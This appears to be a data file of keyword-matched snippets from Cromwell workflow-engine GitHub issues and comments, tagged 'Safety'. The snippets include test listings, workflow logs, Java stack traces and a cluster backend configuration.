Safety,"flow_url_biscayne_sub_wfs (35 seconds, 322 milliseconds); - should successfully run workflow_url_http_relative_imports (35 seconds, 718 milliseconds); - should successfully run workflow_url_square (15 seconds, 152 milliseconds); - should successfully run workflow_url_sub_workflow_hello_world (53 seconds, 160 milliseconds); - should successfully run workflowenginefunctions (45 seconds, 630 milliseconds); - should successfully run writeToCache (1 minute, 15 seconds); - should successfully run write_lines (1 minute, 55 seconds); - should successfully run write_lines_files (3 minutes, 5 seconds); - should successfully run write_tsv (56 seconds, 21 milliseconds); - should NOT call cache the second run of call_cache_hit_prefixes_empty_hint_local !!! IGNORED !!!; - should NOT call cache the second run of call_cache_hit_prefixes_two_roots_empty_hint_cache_miss_papi !!! IGNORED !!!; - should abort a workflow mid run and restart immediately abort.restart_abort_jes !!! IGNORED !!!; - should abort a workflow mid run and restart immediately abort.restart_abort_tes !!! IGNORED !!!; - should call cache the second run of backendWithNoDocker !!! IGNORED !!!; - should call cache the second run of call_cache_hit_prefixes_empty_hint_papi !!! IGNORED !!!; - should call cache the second run of fofn_caching !!! IGNORED !!!; - should call cache the third run of call_cache_hit_prefixes_two_roots_empty_hint_cache_hit_papi !!! IGNORED !!!; - should fail during execution circular_dependencies !!! IGNORED !!!; - should fail during execution google_labels_bad !!! IGNORED !!!; - should fail during execution gpu_on_papi_invalid !!! IGNORED !!!; - should fail during execution localize_file_larger_than_disk_space !!! IGNORED !!!; - should fail during execution missing_input_failure_papiv1 !!! IGNORED !!!; - should fail during execution missing_input_failure_papiv2 !!! IGNORED !!!; - should fail during execution papi_fail_on_bad_attrs !!! IGNORED !!!; - should fail during execution refresh_token_failu",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4992#issuecomment-512361132:16616,abort,abort,16616,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4992#issuecomment-512361132,2,['abort'],['abort']
Safety,"from - to Running; [2018-11-21 15:09:37,18] [info] AwsBatchAsyncBackendJobExecutionActor [02306258test.hello:NA:1]: Status change from Running to Succeeded; [2018-11-21 15:09:39,33] [info] WorkflowExecutionActor-02306258-436a-4372-ab54-2dcd83c42b47 [02306258]: Workflow test complete. Final Outputs:; {; ""test.hello.response"": ""s3://s4-somaticgenomicsrd-valinor/cromwell-execution/test/02306258-436a-4372-ab54-2dcd83c42b47/call-hello/helloWorld.txt""; }; [2018-11-21 15:09:39,37] [info] WorkflowManagerActor WorkflowActor-02306258-436a-4372-ab54-2dcd83c42b47 is in a terminal state: WorkflowSucceededState; [2018-11-21 15:09:43,77] [info] SingleWorkflowRunnerActor workflow finished with status 'Succeeded'.; {; ""outputs"": {; ""test.hello.response"": ""s3://s4-somaticgenomicsrd-valinor/cromwell-execution/test/02306258-436a-4372-ab54-2dcd83c42b47/call-hello/helloWorld.txt""; },; ""id"": ""02306258-436a-4372-ab54-2dcd83c42b47""; }; [2018-11-21 15:09:44,59] [info] Workflow polling stopped; [2018-11-21 15:09:44,60] [info] Shutting down WorkflowStoreActor - Timeout = 5 seconds; [2018-11-21 15:09:44,61] [info] Aborting all running workflows.; [2018-11-21 15:09:44,61] [info] Shutting down WorkflowLogCopyRouter - Timeout = 5 seconds; [2018-11-21 15:09:44,61] [info] WorkflowStoreActor stopped; [2018-11-21 15:09:44,61] [info] Shutting down JobExecutionTokenDispenser - Timeout = 5 seconds; [2018-11-21 15:09:44,62] [info] WorkflowLogCopyRouter stopped; [2018-11-21 15:09:44,62] [info] JobExecutionTokenDispenser stopped; [2018-11-21 15:09:44,62] [info] Shutting down WorkflowManagerActor - Timeout = 3600 seconds; [2018-11-21 15:09:44,62] [info] WorkflowManagerActor All workflows finished; [2018-11-21 15:09:44,62] [info] WorkflowManagerActor stopped; [2018-11-21 15:09:44,62] [info] Connection pools shut down; [2018-11-21 15:09:44,62] [info] Shutting down SubWorkflowStoreActor - Timeout = 1800 seconds; [2018-11-21 15:09:44,62] [info] Shutting down JobStoreActor - Timeout = 1800 seconds; [2018-11-21 15",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4412#issuecomment-440793421:4713,Timeout,Timeout,4713,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4412#issuecomment-440793421,2,"['Abort', 'Timeout']","['Aborting', 'Timeout']"
Safety,"g on condition [0x00007fda90777000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b9a2568> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745); ....snip.... ""ForkJoinPool-2-worker-29"" #38 daemon prio=5 os_prio=0 tid=0x00007fdaf4001000 nid=0xa0e waiting on condition [0x00007fdb8073c000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b540500> (a scala.concurrent.forkjoin.ForkJoinPool); at scala.concurrent.forkjoin.ForkJoinPool.scan(ForkJoinPool.java:2075); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). ""db-1"" #37 daemon prio=5 os_prio=0 tid=0x00007fdaf833e800 nid=0xa0d waiting on condition [0x00007fdb80ad0000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b76aed8> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterrup",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914:3297,Unsafe,Unsafe,3297,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914,1,['Unsafe'],['Unsafe']
Safety,"ge from Running to Success; 2023-04-18 22:00:18,464 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(10fa31a8)myco.pull:106:1]: Status change from Running to Success; 2023-04-18 22:01:20,604 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(10fa31a8)myco.pull:111:1]: Status change from Running to Success; 2023-04-18 22:14:47,728 INFO - WorkflowExecutionActor-10fa31a8-acbe-4ab7-a96a-6550ec08df12 [UUID(10fa31a8)]: Aborting workflow; 2023-04-18 22:14:47,729 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(10fa31a8)myco.pull:262:1]: PipelinesApiAsyncBackendJobExecutionActor [UUID(10fa31a8):myco.pull:262:1] Aborted StandardAsyncJob(projects/16371921765/locations/us-central1/operations/9178938377659283430); 2023-04-18 22:14:47,729 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(10fa31a8)myco.pull:112:1]: PipelinesApiAsyncBackendJobExecutionActor [UUID(10fa31a8):myco.pull:112:1] Aborted StandardAsyncJob(projects/16371921765/locations/us-central1/operations/8559201934542591362); 2023-04-18 22:14:48,295 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(10fa31a8)myco.pull:262:1]: Successfully requested cancellation of projects/16371921765/locations/us-central1/operations/9178938377659283430; 2023-04-18 22:15:56,564 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(10fa31a8)myco.pull:112:1]: Status change from Running to Success; 2023-04-18 22:16:44,505 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(10fa31a8)myco.pull:262:1]: Status change from Running to Cancelled; 2023-04-18 22:16:44,539 INFO - WorkflowExecutionActor-10fa31a8-acbe-4ab7-a96a-6550ec08df12 [UUID(10fa31a8)]: WorkflowExecutionActor [UUID(10fa31a8)] aborted: myco.pull:262:1; 2023-04-18 22:16:45,159 INFO - $f [UUID(10fa31a8)]: Copying workflow logs from /cromwell-workflow-logs/workflow.10fa31a8-acbe-4ab7-a96a-6550ec08df12.log to gs://fc-caa84e5a-8ef7-434e-af9c-feaf6366a042/submissions/93bf6971-bfa1-4cb8-bb22-c8a753f58c49/workflow.logs/workflow.10fa31a8-acbe-4ab7-a96a-6550ec",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7121:5219,Abort,Aborted,5219,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7121,1,['Abort'],['Aborted']
Safety,"google.com/storage/browser/broad-dsde-methods/cromwell-execution-34/PindelSmallVariants/?project=broad-dsde-methods&organizationId=548622027621) using the DSDE-methods Cromwell server V.34. The errors I'm experiencing is described below. Resubmitting the job fixes the problem. ## failure for job ID ; * `2ebeed9a-8f42-418b-8569-8d80f5654d50` (shard-40), ; * `1cc79dda-9c6e-41b4-ac99-e1a422258039` (shard-20). ```; sh: -q: unknown operand; sh: -q: unknown operand; sh: -q: unknown operand; sh: -q: unknown operand; sh: -q: unknown operand; sh: -q: unknown operand; /bin/bash: /cromwell_root/script: No such file or directory; sh: -q: unknown operand; sh: -q: unknown operand; sh: -q: unknown operand; sh: -q: unknown operand; sh: -q: unknown operand; sh: -q: unknown operand; ```. ------------. ## failure for job ID ; * `4c5c8530-b79d-465b-8050-f7ba7368c057` (shard-26), ; * `5cbb2124-c526-4ca0-978e-4154ff4501cd` (shard-0). ```; sh: -q: unknown operand; sh: -q: unknown operand; sh: -q: unknown operand; sh: -q: unknown operand; sh: -q: unknown operand; sh: -q: unknown operand; Initializing parameters...; Pindel version 0.2.5b8, 20151210.; Loading reference genome ...; Loading reference genome done.; Initializing parameters done.; Please use samtools to index your reference file.; .fai is missing. sh: -q: unknown operand; sh: -q: unknown operand; sh: -q: unknown operand; sh: -q: unknown operand; sh: -q: unknown operand; sh: -q: unknown operand; ```. ------------. ## failure for job ID ; * `7f219a29-69c1-4116-9c54-5d4656ee0124`. ```; sh: -q: unknown operand; sh: -q: unknown operand; sh: -q: unknown operand; sh: -q: unknown operand; sh: -q: unknown operand; sh: -q: unknown operand; Initializing parameters...; Pindel version 0.2.5b8, 20151210.; Loading reference genome ...; Error: fasta line starts with  instead of '>'. Aborting.; sh: -q: unknown operand; sh: -q: unknown operand; sh: -q: unknown operand; sh: -q: unknown operand; sh: -q: unknown operand; sh: -q: unknown operand; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4148:1966,Abort,Aborting,1966,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4148,1,['Abort'],['Aborting']
Safety,"he slurm one); #; workflow-options; {; workflow-log-dir: ""cromwell-workflow-logs""; workflow-log-temporary: false; workflow-failure-mode: ""ContinueWhilePossible""; default; {; workflow-type: WDL; workflow-type-version: ""draft-2""; }; }. database {; # Store metadata in a file on disk that can grow much larger than RAM limits.; metadata {; profile = ""slick.jdbc.MySQLProfile$""; db {; url = ""jdbc:mysql:<dburl>?rewriteBatchedStatements=true""; driver = ""com.mysql.cj.jdbc.Driver""; user = ""<user>""; password = ""<pass>"" ; connectionTimeout = 5000; }; }; }. call-caching; {; enabled = true; invalidate-bad-cache-result = true; }. docker {; hash-lookup {; enabled = true; }; }. backend {; default = sge; providers {. ; sge {; 	actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {. # Limits the number of concurrent jobs; #concurrent-job-limit = 5. # If an 'exit-code-timeout-seconds' value is specified:; # - check-alive will be run at this interval for every job; # - if a job is found to be not alive, and no RC file appears after this interval; # - Then it will be marked as Failed.; # Warning: If set, Cromwell will run 'check-alive' for every job at this interval. # exit-code-timeout-seconds = 120. runtime-attributes = """"""; String time = ""11:00:00""; Int cpu = 4; Float? memory_gb; String sge_queue = ""hammer.q""; String? sge_project; String? docker; """""". submit = """"""; qsub \; -terse \; -V \; -b y \; -N ${job_name} \; -wd ${cwd} \; -o ${out}.qsub \; -e ${err}.qsub \; -pe smp ${cpu} \; ${""-l mem_free="" + memory_gb + ""g""} \; ${""-q "" + sge_queue} \; ${""-P "" + sge_project} \; /usr/bin/env bash ${script}; """""". kill = ""qdel ${job_id}""; check-alive = ""qstat -j ${job_id}""; job-id-regex = ""(\\d+)"". submit-docker = """""" ; #location for .sif files and other apptainer tmp, plus lockfile; 	 export APPTAINER_CACHEDIR=<path>; export APPTAINER_PULLFOLDER=<path>; export APPTAINER_TMPDIR=<path>; export LOCK_FILE=""$APPTAINER_CACHEDIR/lockfile""; export IMAGE=$(echo ${do",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7480:2437,timeout,timeout-seconds,2437,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7480,1,['timeout'],['timeout-seconds']
Safety,"her-120 INFO - WorkflowExecutionActor [UUID(13965e09)]: Abort received. Aborting 10 EJEAs; 2016-12-12 18:31:46,093 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(804a56b6)]: Abort received. Aborting 11 EJEAs; 2016-12-12 18:32:05,063 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(2c6302c8)]: Abort received. Aborting 6 EJEAs; 2016-12-12 18:32:25,094 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(793dd16f)]: Abort received. Aborting 5 EJEAs; 2016-12-12 18:32:38,555 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(4fddebd4)]: Abort received. Aborting 13 EJEAs; 2016-12-12 18:32:50,674 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(aadd5082)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:33:01,265 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(edaa9993)]: Abort received. Aborting 4 EJEAs; 2016-12-12 18:33:12,453 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(c2caa0f6)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:33:30,399 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(17a61aa5)]: Abort received. Aborting 4 EJEAs; 2016-12-12 18:33:42,564 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(f6bef34c)]: Abort received. Aborting 9 EJEAs; 2016-12-12 18:34:05,494 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(44318e55)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:34:16,741 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(28d5b663)]: Abort received. Aborting 1 EJEAs; 2016-12-12 18:34:28,999 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(7c8b62e6)]: Ab",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1775:1918,Abort,Abort,1918,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1775,1,['Abort'],['Abort']
Safety,"her-120 INFO - WorkflowExecutionActor [UUID(73be7f27)]: Abort received. Aborting 13 EJEAs; 2016-12-12 18:31:29,146 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(13965e09)]: Abort received. Aborting 10 EJEAs; 2016-12-12 18:31:46,093 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(804a56b6)]: Abort received. Aborting 11 EJEAs; 2016-12-12 18:32:05,063 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(2c6302c8)]: Abort received. Aborting 6 EJEAs; 2016-12-12 18:32:25,094 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(793dd16f)]: Abort received. Aborting 5 EJEAs; 2016-12-12 18:32:38,555 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(4fddebd4)]: Abort received. Aborting 13 EJEAs; 2016-12-12 18:32:50,674 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(aadd5082)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:33:01,265 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(edaa9993)]: Abort received. Aborting 4 EJEAs; 2016-12-12 18:33:12,453 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(c2caa0f6)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:33:30,399 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(17a61aa5)]: Abort received. Aborting 4 EJEAs; 2016-12-12 18:33:42,564 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(f6bef34c)]: Abort received. Aborting 9 EJEAs; 2016-12-12 18:34:05,494 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(44318e55)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:34:16,741 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(28d5b663)]: Abo",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1775:1756,Abort,Abort,1756,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1775,1,['Abort'],['Abort']
Safety,"her-1282 INFO - WorkflowExecutionActor [UUID(4fddebd4)]: Abort received. Aborting 13 EJEAs; 2016-12-12 18:32:50,674 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(aadd5082)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:33:01,265 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(edaa9993)]: Abort received. Aborting 4 EJEAs; 2016-12-12 18:33:12,453 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(c2caa0f6)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:33:30,399 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(17a61aa5)]: Abort received. Aborting 4 EJEAs; 2016-12-12 18:33:42,564 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(f6bef34c)]: Abort received. Aborting 9 EJEAs; 2016-12-12 18:34:05,494 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(44318e55)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:34:16,741 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(28d5b663)]: Abort received. Aborting 1 EJEAs; 2016-12-12 18:34:28,999 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(7c8b62e6)]: Abort received. Aborting 1 EJEAs; 2016-12-12 18:34:40,026 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(3206b2df)]: Abort received. Aborting 1 EJEAs; 2016-12-12 18:35:03,235 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(63064089)]: Abort received. Aborting 6 EJEAs; 2016-12-12 18:35:13,509 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(812336d3)]: Abort received. Aborting 14 EJEAs; 2016-12-12 18:35:23,568 cromwell-system-akka.dispatchers.engine-dispatcher-177 INFO - WorkflowExecutionActor [UUID(197caaf2)]: Abo",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1775:2565,Abort,Abort,2565,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1775,1,['Abort'],['Abort']
Safety,"her-1282 INFO - WorkflowExecutionActor [UUID(793dd16f)]: Abort received. Aborting 5 EJEAs; 2016-12-12 18:32:38,555 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(4fddebd4)]: Abort received. Aborting 13 EJEAs; 2016-12-12 18:32:50,674 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(aadd5082)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:33:01,265 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(edaa9993)]: Abort received. Aborting 4 EJEAs; 2016-12-12 18:33:12,453 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(c2caa0f6)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:33:30,399 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(17a61aa5)]: Abort received. Aborting 4 EJEAs; 2016-12-12 18:33:42,564 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(f6bef34c)]: Abort received. Aborting 9 EJEAs; 2016-12-12 18:34:05,494 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(44318e55)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:34:16,741 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(28d5b663)]: Abort received. Aborting 1 EJEAs; 2016-12-12 18:34:28,999 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(7c8b62e6)]: Abort received. Aborting 1 EJEAs; 2016-12-12 18:34:40,026 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(3206b2df)]: Abort received. Aborting 1 EJEAs; 2016-12-12 18:35:03,235 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(63064089)]: Abort received. Aborting 6 EJEAs; 2016-12-12 18:35:13,509 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(812336d3)]: Abo",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1775:2403,Abort,Abort,2403,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1775,1,['Abort'],['Abort']
Safety,"hey @antonkulaga, sorry for the confusion - we switched to `development` to avoid having to fork the openWDL grammars:; ```wdl; version development. # ...; ```. Hope that helps!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4491#issuecomment-453547478:76,avoid,avoid,76,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4491#issuecomment-453547478,1,['avoid'],['avoid']
Safety,"hing; ```; <!-- Which backend are you running? -->; Used backend: ; GCPBATCH. Callcaching works with PAPIv2, not on GCPBATCH.; <!-- Paste/Attach your workflow if possible: -->; workflow used for testing:; ```; workflow myworkflow {; call mytask; }. task mytask {; String str = ""!""; command <<<; echo ""hello world ${str}""; >>>; output {; String out = read_string(stdout()); }. runtime{; docker: ""eu.gcr.io/project/image_name:tag""; cpu: ""1""; memory: ""500 MB""; disks: ""local-disk 5 HDD""; zones: ""europe-west1-b europe-west1-c europe-west1-d""; preemptible: 2; noAddress: true; }; }; ```; <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->; We are using cromwell through broadinstitute/cromwell:87-ecd44b6 image.; cromwell configuration:; ```; include required(classpath(""application"")). system.new-workflow-poll-rate=1. // increase timeout for http requests..... getting meta-data can timeout for large workflows.; akka.http.server.request-timeout=600s. # Maximum number of input file bytes allowed in order to read each type.; # If exceeded a FileSizeTooBig exception will be thrown.; system {; 	job-rate-control {; 	 jobs = 100; 	 per = 1 second; 	}; input-read-limits {; lines = 128000000; bool = 7; int = 19; float = 50; string = 1280000; json = 12800000; tsv = 1280000000; map = 128000000; object = 128000000; }. # If 'true', a SIGTERM or SIGINT will trigger Cromwell to attempt to gracefully shutdown in server mode,; # in particular clearing up all queued database writes before letting the JVM shut down.; # The shutdown is a multi-phase process, each phase having its own configurable timeout. See the Dev Wiki for more details.; 	graceful-server-shutdown = true; max-concurrent-workflows = 5000. io {; throttle {; # # Global Throttling - This is mostly useful for GCS and can be adjusted to match; # # the quota availble on the GCS API; number-of-requests = 100000; per = 100 seconds; }; }; }. akka {; # Optionally set / override any",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7356:7481,timeout,timeout,7481,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7356,1,['timeout'],['timeout']
Safety,"https://broadworkbench.atlassian.net/browse/WX-765. This compiles and passes tests, though I have a sense that the work done in `YamlUtils.scala` may now be duplicating remediations that are now built in to SnakeYAML. I feel like this PR disables built-in safety checks that we then reimplement. Another possible solution may be to stop disabling the safety checks and adjust the test expectations to match how SnakeYAML reports errors.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6927:169,remediat,remediations,169,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6927,3,"['remediat', 'safe']","['remediations', 'safety']"
Safety,"https://cromwell.gotc-int.broadinstitute.org/swagger/index.html?url=/swagger/cromwell.yaml#!/Workflows/post_workflows_version_id_abort. When going through swagger, the abort takes a long time and then gives an error: ; Response Code 500; ""status"": ""error"",; ""message"": ""The server was not able to produce a timely response to your request."". The workflow is removed from WORKFLOW_STORE_ENTRY but the associated jobs are still present in JOB_STORE_ENTRY. . There are no errors in the logs: ; `; 2016-12-12 18:22:26,139 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(8a965a5e)]: Abort received. Aborting 11 EJEAs; 2016-12-12 18:29:42,727 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(73be7f27)]: Abort received. Aborting 13 EJEAs; 2016-12-12 18:31:29,146 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(13965e09)]: Abort received. Aborting 10 EJEAs; 2016-12-12 18:31:46,093 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(804a56b6)]: Abort received. Aborting 11 EJEAs; 2016-12-12 18:32:05,063 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(2c6302c8)]: Abort received. Aborting 6 EJEAs; 2016-12-12 18:32:25,094 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(793dd16f)]: Abort received. Aborting 5 EJEAs; 2016-12-12 18:32:38,555 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(4fddebd4)]: Abort received. Aborting 13 EJEAs; 2016-12-12 18:32:50,674 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(aadd5082)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:33:01,265 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(edaa9993)]: Abort received. Aborting 4 EJEAs; 2016-12-12 18:33:12,453 cromwell-system-akka.disp",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1775:168,abort,abort,168,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1775,7,"['Abort', 'abort']","['Abort', 'Aborting', 'abort']"
Safety,https://fc-jenkins.dsp-techops.broadinstitute.org/job/cromwell-test-runner/1025/. java.util.concurrent.TimeoutException: Futures timed out after [1 second] at scala.concurrent.impl.Promise$DefaultPromise.ready(Promise.scala:255) at scala.concurrent.impl.Promise$DefaultPromise.result(Promise.scala:259) at scala.concurrent.Await$.$anonfun$result$1(package.scala:215) at scala.concurrent.BlockContext$DefaultBlockContext$.blockOn(BlockContext.scala:53) at scala.concurrent.Await$.result(package.scala:142) at akka.http.scaladsl.testkit.RouteTest.responseAs(RouteTest.scala:70) at akka.http.scaladsl.testkit.RouteTest.responseAs$(RouteTest.scala:68) at cromiam.webservice.SwaggerServiceSpec.responseAs(SwaggerServiceSpec.scala:17) at cromiam.webservice.SwaggerServiceSpec.$anonfun$new$2(SwaggerServiceSpec.scala:30) at scala.util.DynamicVariable.withValue(DynamicVariable.scala:58) at akka.http.scaladsl.testkit.RouteTest.$anonfun$check$1(RouteTest.scala:56) at akka.http.scaladsl.testkit.RouteTestResultComponent$RouteTestResult.$tilde$greater(RouteTestResultComponent.scala:50) at 